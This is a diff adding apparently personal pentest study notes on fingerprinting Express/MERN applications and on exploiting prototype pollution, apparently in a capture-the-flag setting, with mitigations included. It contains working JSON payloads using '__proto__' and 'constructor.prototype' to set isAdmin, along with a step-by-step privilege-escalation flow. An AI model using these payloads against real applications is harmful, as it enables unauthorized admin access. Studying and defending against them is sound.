@@ -1035,3 +1035,239 @@ Check **sitemap.xml** for allowed and most important pages to be listed.
 
 
 
+![[Pasted image 20260730221719.png]]
+
+
+
+
+---
+
+
+
+
+# MERN Stack Fingerprinting & Prototype Pollution (Express)
+
+## MERN Stack
+
+- **M**ongoDB
+    
+- **E**xpress.js
+    
+- **R**eact
+    
+- **N**ode.js
+    
+
+Typical deployment:
+
+- Node.js + Express → `3000` / `5000`
+    
+- MongoDB → `27017`
+    
+- Often behind **Nginx**
+    
+
+---
+
+## Express Fingerprinting
+
+### Headers
+
+```http
+X-Powered-By: Express
+```
+
+- Strong indicator (unless disabled via Helmet or `app.disable("x-powered-by")`).
+    
+
+### Session Cookie
+
+```http
+Set-Cookie: connect.sid=...
+```
+
+- Indicates `express-session`.
+    
+- **Absence ≠ Not Express** (`saveUninitialized: false`).
+    
+
+>A middleware is a function inside the backend that intercepts an incoming request before it reaches the main application logic. It can inspect or modify the request, perform some task (such as authentication, logging, or session handling), and then either pass the request to the next middleware or send a response directly.
+
+### Default 404
+
+```
+Cannot GET /nonexistent
+```
+
+- Classic Express unhandled route response.
+    
+
+---
+
+## Enumeration
+
+- Look for JSON API endpoints:
+    
+    - `/api/...`
+        
+- Common targets:
+    
+    - Profile update
+        
+    - User settings
+        
+    - Preferences
+        
+
+These frequently contain custom merge logic.
+
+---
+
+# Prototype Pollution
+
+### Root Cause
+
+Unsafe recursive merge of user-controlled JSON.
+
+Vulnerable pattern:
+
+```js
+merge(target, source)
+```
+
+without filtering:
+
+- `__proto__`
+    
+- `constructor.prototype`
+    
+- `prototype`
+    
+
+---
+
+## Attack Payload
+
+```json
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+```
+
+Alternative bypass:
+
+```json
+{
+  "constructor": {
+    "prototype": {
+      "isAdmin": true
+    }
+  }
+}
+```
+
+---
+
+## Why it Works
+
+Setting:
+
+```js
+Object.prototype.isAdmin = true;
+```
+
+causes:
+
+```js
+currentUser.isAdmin
+```
+
+to resolve via the **prototype chain**, even if the object has no own `isAdmin` property.
+
+---
+
+## Typical Exploitation Flow
+
+1. Fingerprint Express.
+    
+2. Obtain session (`connect.sid`).
+    
+3. Find JSON update endpoint.
+    
+4. Send prototype pollution payload.
+    
+5. Access protected endpoint.
+    
+
+Example:
+
+```bash
+POST /api/user/update
+```
+
+↓
+
+```json
+{"__proto__":{"isAdmin":true}}
+```
+
+↓
+
+```bash
+GET /api/admin/flag
+```
+
+↓
+
+```
+Flag returned
+```
+
+---
+
+# Mitigation
+
+- Block:
+    
+    - `__proto__`
+        
+    - `prototype`
+        
+    - `constructor`
+        
+- Validate input keys (allowlist).
+    
+- Use safe merge libraries.
+    
+- Keep dependencies updated.
+    
+- Avoid recursive merges on untrusted input.
+    
+
+---
+
+# Quick Pentest Checklist
+
+- ✅ `X-Powered-By: Express`
+    
+- ✅ `connect.sid`
+    
+- ✅ `Cannot GET /random`
+    
+- ✅ JSON update endpoints
+    
+- ✅ Recursive merge logic
+    
+- ✅ Test `__proto__` / `constructor.prototype`
+    
+- ✅ Check privilege escalation via prototype pollution
+
+
+
+-----
+
+
+
+
